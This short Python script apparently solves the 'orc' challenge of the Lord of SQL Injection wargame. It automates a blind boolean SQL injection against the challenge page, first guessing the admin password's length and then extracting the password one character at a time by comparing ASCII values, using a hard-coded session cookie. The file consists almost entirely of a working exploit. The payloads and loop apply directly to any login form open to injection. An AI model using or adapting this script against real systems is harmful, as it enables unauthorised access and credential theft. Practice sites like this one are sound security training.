from pytest import param
import requests
import string
string.printable

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookies = {
    'PHPSESSID' : 'nc39vn3k5l9dspn7mr23h9ugue'
}
params = {
    'pw': None
}

# 비밀번호 길이 구하기
for i in range(9):
    payload= "' or (id='admin' and length(pw)={})-- ".format(i)
    params['pw'] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print(params)

# 
answer = ''
for i in range(1,9):
    for j in string.printable:
        payload = "' or (id='admin' and ascii(substr(pw,{0},1)) = {1})-- ".format(i,ord(j))
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            answer +=j
            print(payload)
            break

print(answer)